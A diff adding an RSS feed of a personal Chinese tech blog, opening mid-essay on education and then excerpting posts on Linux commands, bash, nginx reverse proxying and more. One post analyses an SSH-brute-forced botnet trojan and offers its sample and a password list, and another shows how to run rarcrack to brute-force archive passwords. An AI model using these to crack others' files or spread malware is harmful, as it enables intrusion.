+　比如说，英国人的工程师并不是在学校学出来的，而是在车间里训练出来的。这种办法表明，每个人都能达到他的智力允许他达到的水平。
+　如果他是个平庸的人，没有进一步发展的能力，他可以成为工人或领班，如果天资不俗的话，他便会成为工程师。与个人前程全取决他在19岁时一次几小时考试的做法相比，这种办法更民主，对社会的好处也更多。
+　在医院、矿山和工厂，在建筑师或律师的办公室里，那些十分年轻便开始学业的学生们，按部就班地经历他们的学徒期，在投入实际工作之前，他们也有机会接受一些一般性的教育过程，因此已经准备好了一个框架，可以把他们迅速观察到的东西储存进去，而且他能够利用自己在空闲时间得到的各种各样的技能，逐渐把自己充实成为一个全面而健康的人。
+　在这样的制度下，学生的实践能力得到了发展，并且与学生的才能相适应，发展方向也符合他未来的任务和特定工作的要求，因为这些工作就是他今后要从事的工作。
+　正因为如此，英国和美国的年轻人很快便处在能够尽量发挥自己能力的位置上。他不但成了一个有用的工作者，甚至具备自我创业的能力；他不只是机器上的一个零件，而且变成了一部发动机。
+　我们不妨看一下笛福的小说主人公鲁宾逊，尽管他只是一个文学形象，却反映了英国教育的成功，当鲁宾逊流落于荒岛上时，他发挥了自己的全部能力，像一个完整的社会体系那样，白手创立了一番事业，而这正和英美两国的教育目标相一致。
+　而在制度与此相反的法国，一代又一代人越来越向中国看齐，由此造成的人力浪费还能够接受，然而这种教育制度与实践生活不断脱节的趋势却令人着实难忍。
+　如果从考试、学历、证书和文凭的角度看，坐在学校板凳上啃理论和教科书的时间是有点长得过头了，而且负担过重。即使是采用的方法也糟糕透顶，以至于已经成为了一种严重违反自然的、与社会对立的制度。
+　为此，我们不妨看一下我们的教育制度都做了些什么。
+　过多地延长实际的学徒期、培养懒汉的寄宿制度、过多的人为的训练和填鸭式教学、繁重的功课、对今后的时代完全没有考虑、对人的职业缺乏安排、对年轻人很快就要投身其中的现实世界装聋作哑、不考虑学生如何适应社会、不考虑人类为保护自己而必须从事的斗争、不教给学生如何保持坚强意志……
+　反过来呢？所有必要的准备、所有最重要的学习、那些丰富的常识、坚忍不拔的意志力、凡是该赋予年轻人的东西，我们的学校一样也没有教。
+　这样看起来，我们的教育不但远远没有让他们获得生存能力的素质，反而破坏了他们的这种素质。
+　正因为该准备的没有准备，才使得我们的年轻人一旦走入社会，进入他的活动领域，就开始遭遇一系列的痛苦与挫折，由此给他造成的创痛久久不能痊愈，有时甚至失去生活能力。
+　可以说，这样的教育制度，对年轻人的精神和道德都造成了不良影响，甚至存在着难于恢复的可能，
+　在年轻人的心目中，那种在学校中形成的幻想与美梦，在严酷的现实面前，彻底地破灭了，这种强烈的欺骗感、强烈的失望感，是一个心理素质不完备的青年人绝对难以承受的。
+　也许有人会认为，以上对于教育制度的批判，已经严重脱离了群体心理学的主题。然而可曾有人想过，那些今日正在群体中酝酿，明日就会出现的各种想法和信念，究竟是怎样产生的呢？它产生的土壤又究竟是怎样的呢？
+　当我们了解了现实之后，就更有理由知道，那些被恶化的群众头脑，究竟是如何由当前的制度培养出来的，冷漠而中立的群众是如何变成了一支心怀不满的大军，随时打算听从一切乌托邦分子和能言善辩者的暗示。
+　如果我们不能认清这一点，还任由我们的学校培养一批批狂热的暴徒、无知的民众，那么可以预见的是，在不远的将来，为我们的民族走向衰败铺平道路的，必将是我们的学校。</description>
+    </item>
+    
+    <item>
+      <title>screen in linux</title>
+      <link>https://wrfly.kfd.me/posts/screen-in-linux/</link>
+      <pubDate>Thu, 28 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/screen-in-linux/</guid>
+      <description>本文转自IBM developterWorks
+你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。
+元凶：SIGHUP 信号 让我们来看看为什么关掉窗口/断开连接会使得正在运行的程序死掉。
+在Linux/Unix中，有这样几个概念：
+ 进程组（process group）：一个或多个进程的集合，每一个进程组有唯一一个进程组ID，即进程组长进程的ID。 会话期（session）：一个或多个进程组的集合，有唯一一个会话期首进程（session leader）。会话期ID为首进程的ID。 会话期可以有一个单独的控制终端（controlling terminal）。与控制终端连接的会话期首进程叫做控制进程（controlling process）。当前与终端交互的进程称为前台进程组。其余进程组称为后台进程组。
+ 根据POSIX.1定义：
+ 挂断信号（SIGHUP）默认的动作是终止程序。
+当终端接口检测到网络连接断开，将挂断信号发送给控制进程（会话期首进程）。 如果会话期首进程终止，则该信号发送到该会话期前台进程组。 一个进程退出导致一个孤儿进程组中产生时，如果任意一个孤儿进程组进程处于STOP状态，发送SIGHUP和SIGCONT信号到该进程组中所有进程。
+ 因此当网络断开或终端窗口关闭后，控制进程收到SIGHUP信号退出，会导致该会话期内其他进程退出。
+我们来看一个例子。打开两个SSH终端窗口，在其中一个运行top命令。
+[root@tivf09 root]# top 在另一个终端窗口，找到top的进程ID为5180，其父进程ID为5128，即登录shell。
+[root@tivf09 root]# ps -ef|grep top root 5180 5128 0 01:03 pts/0 00:00:02 top root 5857 3672 0 01:12 pts/2 00:00:00 grep top 使用pstree命令可以更清楚地看到这个关系：
+[root@tivf09 root]# pstree -H 5180|grep top |-sshd-+-sshd---bash---top 使用ps-xj命令可以看到，登录shell（PID 5128）和top在同一个会话期，shell为会话期首进程，所在进程组PGID为5128，top所在进程组PGID为5180，为前台进程组。
+[root@tivf09 root]# ps -xj|grep 5128 5126 5128 5128 5128 pts/0 5180 S 0 0:00 -bash 5128 5180 5180 5128 pts/0 5180 S 0 0:50 top 3672 18095 18094 3672 pts/2 18094 S 0 0:00 grep 5128 关闭第一个SSH窗口，在另一个窗口中可以看到top也被杀掉了。</description>
+    </item>
+    
+    <item>
+      <title>php dos</title>
+      <link>https://wrfly.kfd.me/posts/php-dos/</link>
+      <pubDate>Sun, 24 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/php-dos/</guid>
+      <description>修复漏洞请下载php最新版，并按照官方文档进行配置
+http://php.net/manual/zh/install.unix.nginx.php
+这两天我也没少省心，尽管已经落后别人好远好远了。。
+关于在php上打补丁，我觉得倒不如直接升级来的爽快
+ 升级总是有他的道理的 我懒得重新编译- -  今天一直在弄这个，把一些经验拿出来吧，当然，是给小白看的。
+解压之后，先别急着 configure ，要在configure后面加参数
+./configure --enable-fpm --with-mysql --enable-mbstring --with-mysqli  将以前用到php5-fpm的地方换成php-fpm
+按照文档来，别像我一样不懂装懂就好了～～</description>
+    </item>
+    
+    <item>
+      <title>linux中的tar命令</title>
+      <link>https://wrfly.kfd.me/posts/linux%E4%B8%AD%E7%9A%84tar%E5%91%BD%E4%BB%A4/</link>
+      <pubDate>Mon, 18 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%AD%E7%9A%84tar%E5%91%BD%E4%BB%A4/</guid>
+      <description>原文链接：http://www.tecmint.com/18-tar-command-examples-in-linux/
+tar [-options(&amp;#34;-&amp;#34; is not necessary)] [name] [path or file(default current directory, if epmty)] 废话不多说，直接拿来用～
+创建一个tar文档（打包文档） tar -cvf [name.tar] [path or file] #c-creat v-view(show the progress) f-file(并不会解释) 创建一个tar.gz文档（打包并压缩） tar -cvzf [name.tar.gz] [path or file] #z-compress file to **gzip** 创建tar.bz2文档（压缩，另一种形式） tar cvfj [name.tar.bz2] [path or file] #这次是 **j** 解压一个tar文件 (x-extract-uncompress) tar -xvf [name.tar or name.tar.gz or name.tar.bz2] -c [path] or tar xvf [name.tar or name.tar.gz or name.tar.bz2] #empty for current directory 查看压缩文件目录(list) tar tvf name.</description>
+    </item>
+    
+    <item>
+      <title>linux命令行工具妙用</title>
+      <link>https://wrfly.kfd.me/posts/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E5%A6%99%E7%94%A8/</link>
+      <pubDate>Wed, 13 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E5%A6%99%E7%94%A8/</guid>
+      <description>Fork from:http://mingxinglai.com/cn/2012/08/toos-of-bash/
+前言：虽然现在各种动态脚本语言发展得热火朝天,一片欣欣向荣的景象,而且动态脚本语言如python确实学习成本低,入门快,虽然unix 下各种工具比我们很多人年龄都大,但是我还是相信一些有用的小工具在可预见的时间内不会消失,因为灵活运用它们能够快速解决很多小问题,而且你不大可能写出更短的代码来。
+1. 一行命令算术运算 seq 100 | echo $[ $(tr &amp;#39;\n&amp;#39; &amp;#39;+&amp;#39;) 0] seq 5 3 20 | echo $[ $(tr &amp;#39;\n&amp;#39; &amp;#39;*&amp;#39;) 1] seq 用于产生一组等差的数列,默认首项和公差都是1,所以上面的第一行代码会产生1 －－ 100 的整数,且每个数占一行,使用tr 将换行替换成＋号以后,形成如1+2+......+100+的一行字符串,所以需要在字符串最后加一个0,最后使用echo $[ ]进行算数运算,也可以通过管道使用bc来计算seq 100 | echo $(tr &#39;\n&#39; &#39;+&#39;) 0 | bc。
+2. 100的阶乘末尾有几个零？ 这是计算机专业面试的一个比较有名的题目,正确的解法答案是 n/5 + n/5/5 + n/5/5/5&amp;hellip;&amp;hellip; 下面我们写一行代码来验证一下
+echo {1..100}|tr &amp;#39; &amp;#39; &amp;#39;*&amp;#39;|bc|tr &amp;#39;1-9&amp;#39; &amp;#39;\n&amp;#39;|sort -r| head -1|awk &amp;#39;{print length($0) }&amp;#39; 这里{1..100}属于通配符,例如你要新建100个文件,就可以touch test{1..100}.txt,还可以touch test{a..z}.txt。 算后计算出1乘到100的结果,将结果中非零的数字替换成换行符在1乘到100的结果中,必然是末尾的0最多 所以我们只需要在tr &#39;1-9&#39; &#39;\n&#39;之后,找出最长的那一行就可以了,这里使用的方法是先将结果逆序排序sort -r,然后打印第一行head -,计算出第一行的长度awk &#39;{print length($0)}&#39;。</description>
+    </item>
+    
+    <item>
+      <title>大数的阶乘</title>
+      <link>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</link>
+      <pubDate>Sun, 10 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</guid>
+      <description>To calculate factorial in linux c &amp;amp; bash shell &amp;amp; bc.
+linux c version: #include &amp;lt;stdio.h&amp;gt;int big[10001][800],len[10001],BASE=10000; int i,j,tmp,up,n; void print(int n){ printf(&amp;#34;%d&amp;#34;,big[n][len[n]-1]); for(i=len[n]-2; i &amp;gt;= 0; i--)printf(&amp;#34;%04d&amp;#34;,big[n][i]); printf(&amp;#34;\n&amp;#34;); } int main(){ big[0][0] = big[1][0] = len[0] = len[1] = 1; //0和1的阶乘都是1  for(i=2; i&amp;lt;=10000; i++){ //计算10000以内的所有数的阶乘  up = 0; for(j=0; j&amp;lt;len[i-1]; j++){ tmp = up + i * big[i-1][j]; up = tmp / BASE; tmp = tmp % BASE; big[i][j] = tmp; } if(up &amp;gt; 0){ big[i][j] = up;len[i] = j+1; } else len[i] = j; } while(~scanf(&amp;#34;%d&amp;#34;,&amp;amp;n))print(n); return 0; } bash shell version: #!</description>
+    </item>
+    
+    <item>
+      <title>发生在我同学身上的SSH Psychos</title>
+      <link>https://wrfly.kfd.me/posts/%E5%8F%91%E7%94%9F%E5%9C%A8%E6%88%91%E5%90%8C%E5%AD%A6%E8%BA%AB%E4%B8%8A%E7%9A%84ssh-psychos/</link>
+      <pubDate>Sun, 03 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%8F%91%E7%94%9F%E5%9C%A8%E6%88%91%E5%90%8C%E5%AD%A6%E8%BA%AB%E4%B8%8A%E7%9A%84ssh-psychos/</guid>
+      <description>今天下午bigtang过来说他的VPS也被lock了，DigitalOcean的staff说是有ddos攻击，第一反应是vps沦为了肉鸡，第二反应是，还真是被日了。
+说起来都有点搞笑，一个搞安全的，自己的vps竟然也会被日，23333.
+连接上VNC，登陆进去之后，发现本地目录多了一个 i 文件夹，ps -aux 会发现一些别的命令一直在运行（当时没有截图留念，真是可惜了），
+首先做的是查看登录日志，发现在Apr 30这一天有几台主机一直在暴力登陆本机，ip段为43.255.190.0/23，香港的，一开始是以为这是几台肉鸡，被用来ssh爆破的，但是问题远远没有这么简单。
+/var/log/btmp 文件是用来记录ssh登陆的，bigtang那个竟然有38M，我真是醉了，服务器的auth.log也不小，在四月三十号这天，ssh爆破进行了一天。。。唉，有个僵尸网络就是爽。。。大约爆破了十一个小时后，坏人成功了。
+首先说一下这个木马会干什么: 1.创建开机启动脚本，放在/etc/init.d/目录下，文件名随机
+2.创建周期脚本，每小时运行一次，/etc/cron.hourly/gcc.sh
+3.创建一个可执行的so文件，放在 /lib/libudev.so
+那么这个木马的恶心之处在于什么呢？ 文件不死，因为脚本一直在内存中运行，会不断检测自身是否存在于 /lib/libudev.so 这个文件中，如果不存在,则创建一个并且销毁存在于其他地方的自身。这一步完成之后，这个.so文件还会创建一个开机启动脚本并且设置为开机启动，然后他就会写入shell到gcc.sh,也就是/etc/cron.hourly/gcc.sh。
+这就完了？不，远远没有，他还会自动检测其他的后门、病毒、和木马，并且删除掉他们，以确保自身的安全性和隐蔽性，最重要的是对于主机的完全控制权。 然后听从来自某台主机的命令，在某个时刻统一发起DDOS攻击。。。
+我粗略的扫了一下 43.255.190.0/23 这个网段，大约开了72台，并且！每台主机都开着22端口和6006端口！那么，6006莫非就是他的后门通信端口？
+更为具体的说明在这：
+Threat Spotlight: SSHPsychos
+Group Uses over 300,000 Unique Passwords in SSH Log-In Brute-Force Attacks
+把精神病关进黑洞
+看Level 3与思科如何联手除掉僵尸网络
+也许还会有更为严重的后果，但是我只能看得到这么多了，坐等糖果逆向牛把它搞定。他说要反艹他们来着，23333，但是首先得有一份好的字典啊～
+这是上面提供的那一部分密码字典，我在这里一并奉上，如果你有什么好的字典，记得在下面留言撒～
+最重要的来了！怎样摆脱这个后门呢？ 既然我们删除不掉它，那怎样才能摆脱它呢？
+其实很简单，利用权限。
+chmod 444 /lib/libudev.so 这一条命令执行完成后，删除掉 /etc/cron.hourly/gcc.sh
+rm /etc/cron.hourly/gcc.sh  并且查看/etc/init.d/目录下最近修改的文件，一本来说文件名会是一串乱码，记录这个名字，然后取消其开机启动的link
+更新之后删除这个文件。重启。然后再删除掉 /lib/libudev.so 文件。
+搞定。
+最后的最后 如果有人想玩一下这个后门，可以在虚拟机里面搞一搞，文件上传至这儿</description>
+    </item>
+    
+    <item>
+      <title>Bash里面的&#34;与&#34;和&#34;或&#34;</title>
+      <link>https://wrfly.kfd.me/posts/bash%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%8E%E5%92%8C%E6%88%96/</link>
+      <pubDate>Wed, 29 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/bash%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%8E%E5%92%8C%E6%88%96/</guid>
+      <description>First, let&amp;rsquo;s see some interesting codes. There is a test.sh in the directory, and nothing else.
+And&amp;rdquo;|&amp;rdquo;,&amp;rdquo;||&amp;rdquo;,&amp;rdquo;&amp;amp;&amp;amp;&amp;ldquo;,&amp;rdquo;&amp;gt;&amp;ldquo;,&amp;rdquo;$?&amp;rdquo; these symbols can be easily get via google.
+When I type these commands, it&amp;rsquo;s very confused.
+$ ls | grep asda &amp;amp;&amp;amp; echo $? $ ls | grep asda || echo $? 1 $ ls | grep test || echo $? test.sh $ ls | grep test &amp;gt; /dev/null || echo $? $ ls | grep test &amp;gt; /dev/null &amp;amp;&amp;amp; echo $?</description>
+    </item>
+    
+    <item>
+      <title>Nginx搭建反向代理服务</title>
+      <link>https://wrfly.kfd.me/posts/nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/</link>
+      <pubDate>Sat, 25 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/</guid>
+      <description>这几天一直没有更新博客，可不要以为我在偷懒哦～除了去图书馆找了几本书看之外，我还get了一个新技能，正如标题所言，反向代理。
+去年的时候我就接触过这种反向代理了，那时候是因为goagent太不稳定，不得不找一个php站来代理上网，然后我就偶然之中发现了php反代理这种东西，说白了，就是让php去帮你请求资源，然后再返还给你。如果感兴趣可以翻一下我之前写过的一篇php反代理的，当然，代码不是我写的- -，搜索7ghost也会的到你想要的东西。
+进入正题之前，感谢那些分享知识的前辈们，我是在参考了他们的文章之后学习到很多东西。
+奉上详细链接：
+Nginx反向代理、负载均衡、页面缓存、URL重写及读写分离详解
+Nginx官方文档
+nginx反向代理配置
+调度算法
+其中第一篇已经写的很详细了，有关正向代理，反向代理的介绍什么的；第二篇是nginx的官方文档，也是最最详细和标准的一个；第三篇是我参考的文件，第一遍当然看不懂，但是理解了每句话的内容之后也就明白了，下面的评论也挺搞笑的～。
+那我们就开始步入正题吧！
+ 关于学习，无非就是，是什么，为什么，和怎样做。
+ 是什么？ 首先说明反向代理（reverse proxy）是什么，但是在这之前要先说明正向代理是什么，没错，真有正向代理（proxy）。
+我们平时所说的代理就是正向代理，最常见的就是QQ代理，和VPN代理，以前的QQ主登陆界面的背面都会藏着一些设置选项，最醒目的就是代理，什么http代理啊，socks代理啊，https代理啊，我觉得这个功能是提供给那些在公司里面上不了QQ的人准备的，为什么上不了QQ？老板不让呗！所以就出现了“代理”这个工具，包括现在，也有很多网站提供免费的在线代理（我不是来打广告哒！），有匿名的，也有非匿名的，但是安全性，嘿嘿，真不好说。
+代理的过程大概是这个样子的： 我上不了QQ，但是你可以上，所以我就把数据包发给你，你再帮我把数据包转给QQ服务器，当QQ服务器返回消息的时候，你再返回给我，这样你就充当了一个中间人的角色，也就是，代理。并不是多么难理解，就跟小时候传纸条差不多，中间传递的那个家伙就是我们的代理。
+那么什么是反向代理？
+有这样一种场景，你可以访问QQ的网站，但是我不行，我只能访问360的网站（先不要管为什么了）。但是我们之间的通信是畅通的，也就是说，我可以访问你的网站，那么，我该如何访问QQ呢？当然，我可以通过你这个跳板去上网，比如在你上面弄弄弄个VPN啊，ssh啊，但是如果你不让我这样做呢？你只开放了80端口给我，也就是说，我只能从你这里得到WWW的服务，这可如何是好？（不要问我为什么非要上QQ！）那么有一种办法就是你把QQ的内容抓取下来，放到80端口给我看，也就是说，我间接地通过你上了QQ。而你呢，就充当了反向代理的角色。注意，这里是间接上网，我表面上是访问的你，但是你再后端把QQ给抓过来了，所以，实质上我还是访问的QQ，这样说应该就会很好理解了。
+为什么？ 那么，为什么需要用反向代理呢？
+1. 服务器群的负载均衡 你有很多服务器对外提供服务，虽然说提供的服务都是一样的，但是每台服务器都有自己的IP啊，你不可能只让一台工作吧，那么怎样才能通过一个网址来调动所有的服务器都对外工作呢？这就需要反向代理了，设立一台主机对外开放，剩余的那些作为服务器群在后端负责处理数据，然后，当有请求发送到对外开放的主机上面时，这台主机就会通过算法去调动在后端的主机处理数据，然后把结果返回给客户，这样这台主机就仅仅起到了一个前台的作用，脏活累活什么的就交给了后面的那群主机们干了～前台作为调度员，是有责任处理好这些事务的，刚才说道通过算法进行处理，那么，究竟是什么算法呢？客官且听我慢慢说来。
+[静态方法：仅根据算法本身实现调度：][balala]
+ Round-robin（轮回调度） 我有十台肉鸡，啊不，是服务器，每台服务器的性能都差不多，所以我就采用了这个轮回查询算法，每当有新的业务进来了，前台的调度员就会每台服务器每台服务器的给分配任务，不会偏袒着谁，因为是按照次序来的，1号有任务就分给是2号，2号完了是3号，3号完了就让4号上，但是，如果4号要是挂了呢？这就需要我们设置一个fail_timeout，意思是如果服务器在这个时间里没能应答或者啥的，就把任务再分配给下一台肉鸡，啊不，主机。
+ Weighted round-robin（加权轮回调度） 还是那十台主机，但是有的是Digitalocean的，有的是阿里云的，有的用的是SSD，有的还tm用软盘，有的CPU用的是i7，有的用的是8086&amp;hellip;性能不一样啊！要是按照上面的轮回算法，让一个超级电脑去等一台内存只有512M虚拟机，不能忍！所以，这时候就需要给我们的电脑加权了。好电脑就把权值分配的大一点，渣主机就把权值写小一点。这样前台在调度的时候就会按照他们的权值进行分配，主机A更快，那我就给他多分配点任务，主机B比较慢，那我分配任务的时候就少点。如果你还有兴趣了解，请谷歌“Weighted round-robin”。
+ Source ip Hashing（源地址散列调度） 通俗点讲就是按照你的IP地址给你hash一个主机，然后这台主机就为你服务了，这种算法的优点是什么的？很明显的一对一金牌服务嘛！记得有一次CTF，出题的妖怪在后台部署了好多好多服务器，上传shell每次都会到不同的主机上，那么，你猜他们用的是什么调度方法？没错，反正不是这种。那么如果巧了，同一时间好多任务都给了一台主机，而这台主机又没反应咋弄？调度员也不是傻X，当服务器没有正常反应的时候，他就会给下一台主机分配这个任务了，涉及到很多算法的问题吧，我想。
+ Destination ip Hashing（目标地址散列调度) 这种调度方法主要应用在缓存服务上面，如果好多主机访问的是同一台主机，那么前台调度员就会把这些主机看成同一类，把他们统统交给某一台服务器，怎么说呢，跟上面的哈希溯源正好相反着的，上面是一对一的服务，下面是一对多的服务。反正是缓存服务器嘛，性能肯定棒棒的，让他多做点事情也是没问题的。
+  动态方法：根据算法及后端RS当前的负载状况实现调度：
+啊发现这些东西已经跑题了，所以各位看官有兴趣了解的话就不要听我在这里白活了，链接上面有哦～ 虽然那些文字看起来皱巴巴的 =。=
+2. 海外代理 这就跟海外代购差不多的，我想买化妆品，但是国内没有啊，我就让代购去买，买完了给我就行了。放在服务器上呢，比如说，我想上谷歌，但是伟大的防火墙不让啊，所以我就交给海外的一台主机，让它帮我访问谷歌，然后我在向这台主机请求资源，这样就达到了访问谷歌的目的。https://gg.kfd.me 上面的站是我搭建的google。
+“哎等会儿，你说的这个反向代理和VPN啥的有什么区别，还有我用的Shadowsocks，Goagent，不也都可以实现这种功能吗？”
+哦。
+那我就来扯一扯他们之间的区别。要是让我详细讲，估计一天也讲不完（其实是不会QAQ）。那我就简单粗略的给大家说一下有啥不同。首先说下VPN，VPN可以理解为一条虚拟的网线，我上不去谷歌，但是我远在日本的女朋友可以上啊，所以我就让女朋友答了一个VPN服务器，我呢，就通过VPN这条虚拟的网线连接上了女朋友的电脑，当然就可以上谷歌啦，不仅可以上谷歌，而且还可以……嘿嘿嘿。
+那么，shadowsocks和goagent呢，他们都是代理软件，原理类似于上面讲到的正向代理，但是，代理的主机是127.0.0.1，也就是你自己的主机，如果在浏览器上设置了代理的话，那么你浏览器的流量都会先在本机走一圈，也就是通过那些shadowsocks啊goagent啊走一遍，而goagent呢，是连接了外网的家伙，我这里的外网，指的是out of China 的网，当然，在国内部署Goagent也不是不可以，只是你上不了谷歌而已，上上百度啊，QQ啊，360啊还都是可以的。Goagent会把流经它的数据转发到你部署的服务器上，在通过服务器进行资源请求。我之前也写过一篇关于goagent的，感兴趣的可以看一下。Shadowsocks的原理类似，不在赘述。
+怎样做？ 基本的配置Nginx我就不说了，网上一搜一大把，我在这里啰啰嗦嗦，大家也觉着没意思。如果说有什么需要注意的，那可能就是注意代理谷歌的时候不要被墙了你的域名。（我简直就是在作死……）
+然后，我也不想做一个搬运工，把那些长篇大论以及图片复制粘贴过来，所以我就直接贴出配置文档以供大家参考，如果你把这份配置放在服务器上的话，你也会得到一个谷歌的反向代理以造福国人。顺便说下，kfd.me 这个域名是我的。
+proxy_cache_path /var/www/cache/ levels=1:2 keys_zone=one:100m max_size=1g; proxy_cache_key $host$request_uri; upstream google{ server 74.</description>
+    </item>
+    
+    <item>
+      <title>let commmand was not found in bash?</title>
+      <link>https://wrfly.kfd.me/posts/let-commmand-was-not-found-in-bash/</link>
+      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/let-commmand-was-not-found-in-bash/</guid>
+      <description>要解决问题,首先要遇到问题.
+在bash中运行下面一段代码:
+#!/bin/bash #spawn.sh PIDS=$(pidof sh $0) P_array=($PIDS) echo $PIDS let &amp;#34;instances=${#P_array[*]}- 1&amp;#34; echo &amp;#34;$instancesinstance(s) of this script running.&amp;#34; echo &amp;#34;[Hit Ctl-C to exit.]&amp;#34;; echo sleep 1 sh $0 exit 0 你会得到什么?
+运行错误?let命令找不到了? OK, 反正是运行不了, 当然, 除了第一句.
+这是在高级bash脚本编程指南中的一个例子,但是在我的ubuntu中却报错了,为什么?
+搜索了一下,发现这个let是bash的内建命令,什么意思呢?就是只有bash有这个命令,而sh, dash, 都没有这个命令.
+如果想知道你电脑中到底有什么shell,可以通过
+cat /etc/shells 这个命令来得知.
+# /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash /bin/ksh93 /usr/bin/screen 但是我们在脚本第一行已经写明了要用bash运行啊,为什么还不可以?
+Ok,请问,你运行的方式是什么呢? sh script.sh ? 这样还是用sh运行呀,而且Ubuntu中sh默认关联的shell是dash,并不是bash.所以才会出现 let command not found 这种情况.
+(PS:最关键的一句! 倒数第二行! 脚本用了sh来运行自身, 所以才会在第二次循环运行时出现错误!</description>
+    </item>
+    
+    <item>
+      <title>一些小东西,关于alias</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E4%BA%9B%E5%B0%8F%E4%B8%9C%E8%A5%BF%E5%85%B3%E4%BA%8Ealias/</link>
+      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E4%BA%9B%E5%B0%8F%E4%B8%9C%E8%A5%BF%E5%85%B3%E4%BA%8Ealias/</guid>
+      <description>alias 是一个设置别名的小工具~
+具体可见维基百科
+但是它只会解析别名, 也就是说, 如果你告诉它, 张三跟张麻子是一个人, 你说张三, 他就知道你说的是张麻子, 但是如果你告诉他张三欠我一块钱, 那他就gg了, 人家并不能理解张麻子欠你一块钱啊. 或许他会说: 等等, 一块钱是什么?
+这里我遇到的问题是如何传递参数进去.
+curl ipinfo.io/8.8.8.8 这条命令是查看 8.8.8.8 的ip所在地, 那么, 如果我设置了
+alias ipadrs=&amp;#39;curl ipinfo.io/$1&amp;#39; 会不会成功?
+当然不会, 因为他不知道, 也无法处理你给他传进去的 ip.
+没有办法么?
+当然不是.
+这里用到的技巧是function命令.
+首先定义一个function hi() #你也可以把这个function去掉, 如果你觉得啰嗦的话,毕竟系统知道这是一个函数而不是好吃的.
+function hi(){ echo &amp;#34;Hello $1!&amp;#34; } 当然啦,你完全可以横着写:
+function hi(){ echo &amp;#34;Hello $1!&amp;#34;;} #你也可以把这个function去掉, 并不像C那样声明一下返回值 然后你在命令行里输入
+hi world 有点意思吧! 我们已经可以把参数传递进去了耶~
+且慢! 如果你关闭了这个窗口, 你就会发现, 为毛行不通了?
+那是必须的, 因为在这个shell中运行的是临时变量, 也就是说没有在文件中保存下来, 毕竟我们没有对文件进行操作啊, 所以呢, 就要把他记录下来, 然后每次运行的时候都会有这个function. 但是话又说回来, 往哪儿写呢?</description>
+    </item>
+    
+    <item>
+      <title>linux下暴力破解rar，zip文件</title>
+      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3rarzip%E6%96%87%E4%BB%B6/</link>
+      <pubDate>Tue, 07 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3rarzip%E6%96%87%E4%BB%B6/</guid>
+      <description>Linux暴力破解RAR，ZIP，7Z压缩包
+rarcrack,其官方主页：http://rarcrack.sourceforge.net/
+该软件用于暴力破解压缩文件的密码，但仅支持RAR, ZIP, 7Z这三种类型，其特点是可以使用多线程而且可以暂停与继续(会在当前目录生成一个xml文件，里面显示了正在尝试的一个密码)。
+安装方法
+首先从官网下载安装包，然后执行如下命令
+$ tar -xjf rarcrack-0.2.tar.bz2 $ cd rarcrack-0.2.tar.bz2 $ make $ make install 使用方法
+rarcrack 文件名 [--threads thread_num] [--type rar|zip|7z] 该软件还自带了测试样例，该目录内，执行 rarcrack test.rar &amp;ndash;threads 4 &amp;ndash;type rar ，等待一会儿即可得到结果。
+如果要改变尝试的位置可以直接打开xml，修改当前密码那一行即可。
+如果出现如下错误：
+gcc -pthread rarcrack.c xml2-config --libs --cflags -O2 -o rarcrack /bin/sh: 1: xml2-config: not found In file included from rarcrack.c:21:0: rarcrack.h:25:48: 致命错误： libxml/xmlmemory.h：没有那个文件或目录 编译中断。 make: *** [all] 错误 1 则执行：
+sudo apt-get install libxml2-dev libxslt-dev 安装相应的依赖包。</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu开启休眠模式</title>
+      <link>https://wrfly.kfd.me/posts/ubuntu%E5%BC%80%E5%90%AF%E4%BC%91%E7%9C%A0%E6%A8%A1%E5%BC%8F/</link>
+      <pubDate>Mon, 06 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/ubuntu%E5%BC%80%E5%90%AF%E4%BC%91%E7%9C%A0%E6%A8%A1%E5%BC%8F/</guid>
+      <description>在电源菜单中有一个sleep，那是睡眠，即
